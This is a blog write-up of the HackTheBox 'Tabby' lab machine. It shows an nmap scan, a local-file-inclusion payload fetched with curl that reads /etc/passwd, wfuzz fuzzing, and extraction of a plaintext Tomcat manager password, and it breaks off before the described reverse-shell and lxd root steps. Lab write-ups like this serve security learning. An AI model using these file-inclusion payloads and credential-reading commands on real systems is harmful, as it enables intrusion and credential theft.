<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Discvering a new domain and adding it to the hosts file , Identifying a Local-file-Inclusion and extracting sensitive information . Fuzzing some dirs and got the tomcat-users.xml which contain username and password for tomcat-manager , Generating a java-payload and uploading it to get an initial reverse shell . or using metasploit to exploit the tomcat-deploy . Got a zip file cracking it with john and the password that is cracked is of user ash , The user ash is in lxd group . By importing and initialization lxd image and mouting the root dir , We got shell as root" /><meta property="og:title" content="Hackthebox Tabby writeup" /><meta property="og:description" content="Discvering a new domain and adding it to the hosts file , Identifying a Local-file-Inclusion and extracting sensitive information . Fuzzing some dirs and got the tomcat-users.xml which contain username and password for tomcat-manager , Generating a java-payload and uploading it to get an initial reverse shell . or using metasploit to exploit the tomcat-deploy . Got a zip file cracking it with john and the password that is cracked is of user ash , The user ash is in lxd group . By importing and initialization lxd image and mouting the root dir , We got shell as root" /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/tabby/tabby.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Tabby writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Discvering a new domain and adding it to the hosts file , Identifying a Local-file-Inclusion and extracting sensitive information . Fuzzing some dirs and got the tomcat-users.xml which contain username and password for tomcat-manager , Generating a java-payload and uploading it to get an initial reverse shell . or using metasploit to exploit the tomcat-deploy . Got a zip file cracking it with john and the password that is cracked is of user ash , The user ash is in lxd group . By importing and initialization lxd image and mouting the root dir , We got shell as root"><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/tabby/tabby.png"><title>Hackthebox Tabby writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Tabby writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Tabby writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Jun 23, 2020, 12:00 AM +0800" > Jun 23 <i class="unloaded">2020-06-23T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/tabby/tabby.png" class="post-preview-img"><h1 id="introductiontabby">Introduction@Tabby:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Tabby<tr><td>IP<td>10.10.10.194<tr><td>Points<td>20<tr><td>Os<td>Linux<tr><td>Difficulty<td>Linux<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/1190" target="_blank">egre55</a><tr><td>Out On<td>20 June 2020</table></div><h1 id="brieftabby">Brief@Tabby:~$</h1><p>Discvering a new <code class="language-plaintext highlighter-rouge">domain</code> and adding it to the hosts file , Identifying a <strong>Local-file-Inclusion</strong> and extracting <code class="language-plaintext highlighter-rouge">sensitive</code> information . Fuzzing some dirs and got the <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> which contain username and password for <strong>tomcat-manager</strong> , Generating a <code class="language-plaintext highlighter-rouge">java-payload</code> and uploading it to get an initial <strong>reverse</strong> shell . or using <code class="language-plaintext highlighter-rouge">metasploit</code> to exploit the <strong>tomcat-deploy</strong> . Got a zip file cracking it with <code class="language-plaintext highlighter-rouge">john</code> and the password that is cracked is of user <strong>ash</strong> , The user <strong>ash</strong> is in <code class="language-plaintext highlighter-rouge">lxd</code> group . By <strong>importing</strong> and <strong>initialization</strong> lxd image and mouting the root dir , We got shell as root.</p><h1 id="summary-">Summary :~$</h1><ul><li>Discovering the new domain and adding it to <strong>/etc/hosts</strong><li><code class="language-plaintext highlighter-rouge">identigying</code> the <code class="language-plaintext highlighter-rouge">lfi</code> by the news tab<li><code class="language-plaintext highlighter-rouge">extracting</code> the credentials of tomcat from the file <strong>tomcat-users.xml</strong><li>login into to tomcat <code class="language-plaintext highlighter-rouge">manager-scripts</code><li><strong>generating</strong> the payload using <code class="language-plaintext highlighter-rouge">msfvenom</code><li>uploading the payload to tomcat using <strong>tomcat-deploy</strong> using curl<li><strong>executing/accessing</strong> the file and got a <code class="language-plaintext highlighter-rouge">reverse</code> shell<li>attacking the <code class="language-plaintext highlighter-rouge">tomcat-deploy</code> using <strong>metasploit</strong><li>Got a <code class="language-plaintext highlighter-rouge">zip</code> file and downloading it to my <strong>machine</strong><li>using <strong>zip2john</strong> to get the respective <code class="language-plaintext highlighter-rouge">hash</code> of the file<li><strong>cracking</strong> the hash using <code class="language-plaintext highlighter-rouge">john</code><li>login in as <code class="language-plaintext highlighter-rouge">ash</code> using the passowrd <strong>cracked</strong><li>Got <strong>user.txt</strong><li>the user is in <strong>lxd</strong> group<li>abusing <code class="language-plaintext highlighter-rouge">lxd</code> and importing custom image<li><strong>Mounting</strong> the <code class="language-plaintext highlighter-rouge">/root</code> to /mnt<li>got <code class="language-plaintext highlighter-rouge">root.txt</code></ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/tabby/tabby.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>➜  tabby nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oA</span> scans/nmap.full <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-v</span> tabby.htb
<span class="c"># Nmap 7.80 scan initiated Sun Jun 21 00:24:46 2020 as: nmap -sV -sC -oA scans/nmap.full -p- -T4 -v tabby.htb</span>
Increasing send delay <span class="k">for </span>10.10.10.194 from 0 to 5 due to 1179 out of 2947 dropped probes since last increase.
Nmap scan report <span class="k">for </span>tabby.htb <span class="o">(</span>10.10.10.194<span class="o">)</span>
Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache Tomcat
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Jun 21 00:43:18 2020 -- 1 IP address (1 host up) scanned in 1111.98 seconds</span>
</pre></table></code></div></div><p>Basically three ports <code class="language-plaintext highlighter-rouge">22:ssh</code> , <code class="language-plaintext highlighter-rouge">80:http</code> , <code class="language-plaintext highlighter-rouge">8080:http-tomcat</code></p><p>I took a look at both the <code class="language-plaintext highlighter-rouge">http</code> ports</p><h2 id="port-8080">Port-8080</h2><p><a href="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-1.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-1.png" alt="port 8080" /></a></p><p>We can see that <code class="language-plaintext highlighter-rouge">tomcat</code> is running and thats its initial page</p><p><a href="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-2.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-2.png" alt="port 8080" /></a></p><p>And <code class="language-plaintext highlighter-rouge">obviously</code> it will be needed to sign in for the <code class="language-plaintext highlighter-rouge">admin</code> role</p><h2 id="port-80">Port-80</h2><p><a href="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-3.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-3.png" alt="port 80" /></a></p><p>And its looking like <code class="language-plaintext highlighter-rouge">cloud-hosting</code> <strong>website</strong> and i checked all the tabs from the <code class="language-plaintext highlighter-rouge">menu bar</code> and there is a <code class="language-plaintext highlighter-rouge">news</code> tab clicking on it, and it take me to the another <code class="language-plaintext highlighter-rouge">domain</code></p><p><a href="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-4.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-4.png" alt="port 80" /></a></p><p>And added the new domain <code class="language-plaintext highlighter-rouge">megahosting.htb</code> to the <strong>/etc/hosts</strong> file</p><blockquote><p>megahosting.htb</p></blockquote><p><a href="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-5.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-5.png" alt="port 80" /></a></p><p>The url looks very suspicious because it including the <code class="language-plaintext highlighter-rouge">statement</code> file in a <code class="language-plaintext highlighter-rouge">lfi</code> way</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://megahosting.htb/news.php?file<span class="o">=</span>statement
</pre></table></code></div></div><h1 id="the-lfi">The Lfi</h1><p>I just test for a lfi to check if i can <strong>something</strong> and the payload was</p><blockquote><p>payload</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://megahosting.htb/news.php?file<span class="o">=</span>../../../../etc/passwd
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>➜  prashant curl <span class="s2">"http://megahosting.htb/news.php?file=../../../../etc/passwd"</span>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
</pre></table></code></div></div><p>And yeah i got the <code class="language-plaintext highlighter-rouge">passwd</code> file so there is a lfi for sure</p><h2 id="getting-the-tomcat-files">Getting the tomcat files</h2><p>Since we have a lfi so we can simply get the <code class="language-plaintext highlighter-rouge">credentials</code> since it is also stored under the machine in a file <strong>somewhere</strong></p><p>I googled about this thing and got that the <code class="language-plaintext highlighter-rouge">users=creds</code> are stored in a <strong>tomcat-users.xml</strong></p><blockquote><p><a href="http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html" target="_blank">http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html</a></p></blockquote><p>and also the initial page from the port <code class="language-plaintext highlighter-rouge">8080</code> tells everything</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>It works <span class="o">!</span>
If you<span class="s1">'re seeing this page via a web browser, it means you'</span>ve setup Tomcat successfully. Congratulations!

This is the default Tomcat home page. It can be found on the <span class="nb">local </span>filesystem at: /var/lib/tomcat9/webapps/ROOT/index.html

Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME <span class="k">in</span> /usr/share/tomcat9 and CATALINA_BASE <span class="k">in</span> /var/lib/tomcat9, following the rules from /usr/share/doc/tomcat9-common/RUNNING.txt.gz.

You might consider installing the following packages, <span class="k">if </span>you havent already <span class="k">done </span>so:

tomcat9-docs: This package installs a web application that allows to browse the Tomcat 9 documentation locally. Once installed, you can access it by clicking here.

tomcat9-examples: This package installs a web application that allows to access the Tomcat 9 Servlet and JSP examples. Once installed, you can access it by clicking here.

tomcat9-admin: This package installs two web applications that can <span class="nb">help </span>managing this Tomcat instance. Once installed, you can access the manager webapp and the host-manager webapp.

NOTE: For security reasons, using the manager webapp is restricted to <span class="nb">users </span>with role <span class="s2">"manager-gui"</span><span class="nb">.</span> The host-manager webapp is restricted to <span class="nb">users </span>with role <span class="s2">"admin-gui"</span><span class="nb">.</span> Users are defined <span class="k">in</span> /etc/tomcat9/tomcat-users.xml.
</pre></table></code></div></div><p>SO the file we are looking for is in the <strong><code class="language-plaintext highlighter-rouge">CATALINA_HOME</code>/conf/tomcat-users.xml</strong> and the <strong>CATALINA_HOME</strong> is set to <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9</code> according to the line.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME <span class="k">in</span> /usr/share/tomcat9 and CATALINA_BASE <span class="k">in</span> /var/lib/tomcat9, following the rules from /usr/share/doc/tomcat9-common/RUNNING.txt.gz.
</pre></table></code></div></div><p>and its time to get the file with <code class="language-plaintext highlighter-rouge">path</code> <strong>/usr/share/tomcat9/conf/tomcat-users.xml</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>➜  prashant curl <span class="s2">"http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/conf/tomcat-users.xml"</span>
➜  prashant
</pre></table></code></div></div><p>and got nothing because the file doesnt exist….</p><p>But if i look at the line at last there is a path mentioned <strong>/etc/tomcat9/tomcat-users.xml</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>➜  prashant curl <span class="s2">"http://megahosting.htb/news.php?file=../../../../etc/tomcat9/tomcat-users.xml."</span>           
➜  prashant
</pre></table></code></div></div><p>That also doent exist..then i just fuzz the $conf$ dir from the <code class="language-plaintext highlighter-rouge">CATALINA_HOME</code> and got a dir <code class="language-plaintext highlighter-rouge">etc</code></p><blockquote><p>fuzzing</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>➜  prashant wfuzz <span class="nt">-u</span> <span class="s2">"http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml"</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--hh</span> 0

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.

<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 2.4.5 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://megahosting.htb/news.php?file<span class="o">=</span>../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml
Total requests: 220560

<span class="o">===================================================================</span>
ID           Response   Lines    Word     Chars       Payload                                                                                                                                           
<span class="o">===================================================================</span>

000001411:   200        47 L     289 W    2325 Ch     <span class="s2">"etc"</span> 
</pre></table></code></div></div><p>And i can get the file finally</p><blockquote><p>tomcat-users.xml</p></blockquote><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre><td class="rouge-code"><pre>➜  prashant curl "http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml"
<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="c">&lt;!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&gt;</span>
<span class="nt">&lt;tomcat-users</span> <span class="na">xmlns=</span><span class="s">"http://tomcat.apache.org/xml"</span>
              <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
              <span class="na">xsi:schemaLocation=</span><span class="s">"http://tomcat.apache.org/xml tomcat-users.xsd"</span>
              <span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
<span class="c">&lt;!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
--&gt;</span>
<span class="c">&lt;!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds
  them. You will also need to set the passwords to something appropriate.
--&gt;</span>
<span class="c">&lt;!--
  &lt;role rolename="tomcat"/&gt;
  &lt;role rolename="role1"/&gt;
  &lt;user username="tomcat" password="&lt;must-be-changed&gt;" roles="tomcat"/&gt;
  &lt;user username="both" password="&lt;must-be-changed&gt;" roles="tomcat,role1"/&gt;
  &lt;user username="role1" password="&lt;must-be-changed&gt;" roles="role1"/&gt;
--&gt;</span>
   <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"admin-gui"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"manager-script"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">"tomcat"</span> <span class="na">password=</span><span class="s">"$3cureP4s5w0rd123!"</span> <span class="na">roles=</span><span class="s">"admin-gui,manager-script"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/tomcat-users&gt;</span>
</pre></table></code></div></div><p>And at the end i got the file and the <code class="language-plaintext highlighter-rouge">credentials</code> also <code class="language-plaintext highlighter-rouge">tomcat : $3cureP4s5w0rd123!</code> and the roles we have are</p><ul><li>admin-gui<li>manager-script</ul><p><a href="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-6.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-6.png" alt="port 80" /></a></p><p>And thats is because i dont have suitable <code class="language-plaintext highlighter-rouge">role</code> to access that</p><p><a href="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-7.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/tabby/0793dcdc-194d-4fe6-bb48-d5a438bbeb07/image-7.png" alt="port 80" /></a></p><p>and i can access the <code class="language-plaintext highlighter-rouge">host-manager</code> but nothing was there this role comes under the <strong>Admin-gui</strong> , the thing is left now is <code class="language-plaintext highlighter-rouge">manager-script</code></p><p>There is a thing we can do as <code class="language-plaintext highlighter-rouge">manager-script</code> role is upload files on the tomcat using <code class="language-plaintext highlighter-rouge">deploy</code> . i found couple of article and some metasploit-module regarding the <code class="language-plaintext highlighter-rouge">deploy</code></p><blockquote><p><a href="https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script" 